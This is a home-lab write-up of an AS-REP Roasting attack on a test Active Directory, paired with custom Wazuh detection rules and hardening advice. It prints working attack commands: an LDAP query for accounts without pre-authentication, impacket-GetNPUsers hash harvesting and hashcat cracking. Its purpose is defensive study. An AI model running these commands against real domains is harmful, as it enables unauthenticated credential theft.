# AS-REP Roasting — End-to-End Attack and Detection

**Attack date:** 2026-10-11 / 2026-10-12
**Environment:** lab.local (isolated home lab)
**MITRE ATT&CK:** [T1558.004 — AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) (Credential Access)

## Summary

Executed an AS-REP Roasting attack against a lab Active Directory, 
harvesting 213 Kerberos AS-REP hashes WITHOUT any prior credentials, 
cracking one weak password offline in under 5 seconds, and designing 
2 custom Wazuh detection rules that successfully triggered 43 
correlation alerts during the attack.

Key difference from Kerberoasting (T1558.003) demonstrated in previous 
case: AS-REP Roasting requires NO authenticated access — attacker 
only needs network reach to the Domain Controller and knowledge of 
usernames (easily enumerated via LDAP, OSINT, or dictionary attacks).

## Attack chain

### Phase 1 — Target enumeration

Identified AS-REP roastable accounts using LDAP query filtering by 
`userAccountControl` flag `DONT_REQ_PREAUTH` (0x400000):

​```bash
ldapsearch -x -H ldap://10.10.10.10 \
  -D 'DELLA_GUERRERO@lab.local' -w 'LabUser2026!' \
  -b 'DC=lab,DC=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName
​```

**Result:** "numerous accounts" accounts identified with DONT_REQ_PREAUTH flag.

Note: This step used authenticated LDAP for lab convenience. A real 
attacker would use null-bind LDAP queries, OSINT username lists, or 
dictionary attacks against common service account naming conventions 
(svc_*, service_*, app_*).

### Phase 2 — AS-REP hash harvesting (NO credentials used)

​```bash
impacket-GetNPUsers lab.local/ \
  -dc-ip 10.10.10.10 \
  -no-pass \
  -usersfile targets.txt \
  -format hashcat \
  -outputfile asrep_hashes.txt
​```

**Result:** 213 `$krb5asrep$23$...` hashes captured in under 30 seconds.

**Critical observation:** no authentication required. The DC returns 
AS-REP tickets for every account with DONT_REQ_PREAUTH set, cryptographically 
protected by the user's password hash — enabling offline cracking.

![[Pasted image 20261012002554.png]]

### Phase 3 — Offline cracking demonstration

Initial attempt against full 213-hash set with rockyou wordlist: 
pseudo-random BadBlood passwords resisted dictionary attack 
(expected behavior for hardened accounts).

To demonstrate the complete attack chain including successful crack, 
one service account (svc_asrep_weak) was reconfigured with a common 
weak password (`Password1`). Attack repeated targeting only that 
account:

​```bash
hashcat -m 18200 easy_crack.txt /usr/share/wordlists/rockyou.txt --force -O -w 1
​```

**Result: cracked in 0 seconds, at 0.03% dictionary progress.**

​```
Status...........: Cracked
Recovered........: 1/1 (100.00%)
Time.Estimated...: 0 secs
Progress.........: 4096/14344385 (0.03%)
​```

This mirrors real-world risk: legacy service accounts with weak 
passwords and DONT_REQ_PREAUTH flag create instant compromise paths 
for attackers with zero prior access to the domain.

![[Pasted image 20261012002654.png]]
## Detection engineering

### Gap identified

Same pattern observed in previous Kerberoasting (T1558.003) and 
BloodHound (T1087.002) cases: Wazuh out-of-the-box rules assign 
level ≤ 3 to individual 4768 events. Default `log_alert_level` of 3 
filters them from dashboard visibility, hiding the attack pattern 
from analysts.

**Verification:** archives.json contained 226 events of ID 4768 
during the attack, zero fired via default rules at visible level.

### Custom rules developed

Two-layer detection in `local_rules.xml`:

| Rule ID | Level | Purpose |
|---------|-------|---------|
| 100400 | 5 | Baseline visibility — all 4768 TGT requests visible in dashboard |
| 100402 | 12 | Attack correlation — 5+ TGT requests from same source IP in 60s |

Rule source:

​```xml
<group name="windows,kerberos,asrep,custom_jochy">

  <rule id="100400" level="5">
    <if_sid>60103,60204</if_sid>
    <field name="win.system.eventID">^4768$</field>
    <description>Windows: Kerberos TGT requested - Event 4768 (custom baseline for AS-REP visibility)</description>
    <mitre>
      <id>T1558</id>
      <id>T1558.004</id>
    </mitre>
    <group>kerberos,credential_access,asrep_roasting,</group>
  </rule>

  <rule id="100402" level="12" frequency="5" timeframe="60">
    <if_matched_sid>100400</if_matched_sid>
    <same_field>win.eventdata.ipAddress</same_field>
    <description>AS-REP Roasting attack detected: burst coming from $(win.eventdata.ipAddress)</description>
    <mitre>
      <id>T1558.004</id>
    </mitre>
    <group>asrep_roasting,attack_pattern,</group>
  </rule>

</group>
​```

**Design decision — same_field: `win.eventdata.ipAddress` (not subjectUserName):**  
Unlike Kerberoasting (where attacker is authenticated), AS-REP Roasting 
is UNAUTHENTICATED. Windows cannot log a `subjectUserName` for the 
attacker — only the source IP. This design choice is specific to the 
threat model and demonstrates why detection engineering requires 
understanding of underlying protocols, not just copy-paste from 
templates.

### Detection results during real attack

- Rule 100400: 188 alerts (one per 4768 captured)
- Rule 100402: 43 correlation alerts triggered

Sample 100402 alert:
- `rule.level`: 12
- `rule.description`: "AS-REP Roasting attack detected: burst coming from ::ffff:10.10.10.200"
- `agent.name`: DC01
- `data.win.eventdata.ipAddress`: ::ffff:10.10.10.200 (IPv6-mapped IPv4, Kali attacker)

![[Pasted image 20261012003641.png]]
## Hardening recommendations

### Kerberos configuration
- **Remove DONT_REQ_PREAUTH flag from ALL accounts** unless explicitly 
  required by legacy integration. In most environments: zero legitimate 
  need.
- Audit accounts quarterly:
  ​```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
  ​```
- For legacy applications requiring DONT_REQ_PREAUTH, enforce ≥25-char 
  random passwords and consider migration to Kerberos armoring 
  (FAST/Flexible Authentication Secure Tunneling).

### Detection layer
- Deploy baseline + correlation rules equivalent to 100400 / 100402
- Monitor source IPs generating burst 4768 events — single source + 
  high volume = red flag regardless of authenticated status
- Consider enriching alerts with threat intel on source IP geolocation

### Response
- Rule 100402 firing should trigger immediate investigation
- Rotate passwords for all accounts in the targeted burst
- Review authentication logs for signs of successful offline crack 
  usage (anomalous logins from service accounts in subsequent days)

## Comparison to previous cases

| Technique | MITRE | Prerequisite | Key event | Correlation field |
|-----------|-------|--------------|-----------|-------------------|
| Kerberoasting | T1558.003 | Valid domain user credentials + SPN on target | 4769 | subjectUserName |
| AS-REP Roasting | T1558.004 | DONT_REQ_PREAUTH on target (no auth needed) | 4768 | ipAddress |
| BloodHound recon | T1087.002 | Valid domain user credentials | 4662 | subjectUserName |

AS-REP Roasting is the LEAST authenticated of the three, making it 
accessible to attackers with only network reach to the DC. This 
elevates its priority for defensive attention.

## Key learnings documented separately

- Wazuh decoder/rule architecture: parent rules via `<if_sid>` enable 
  modular custom detections
- Windows LDAP error codes (particularly `data 532` = password expired, 
  common issue in long-pause lab environments)
- Correlation field selection depends on protocol semantics 
  (authenticated vs unauthenticated attacks)
- Lab hygiene: default 42-day password expiration requires 
  PasswordNeverExpires management for pause recovery

## Files in this case

- `README.md` — this write-up
- `screenshots/` — ldapsearch output, impacket harvest, hashcat crack, 
  Wazuh correlation alert
- `rules/asrep-detection.xml` — Wazuh rules 100400 + 100402
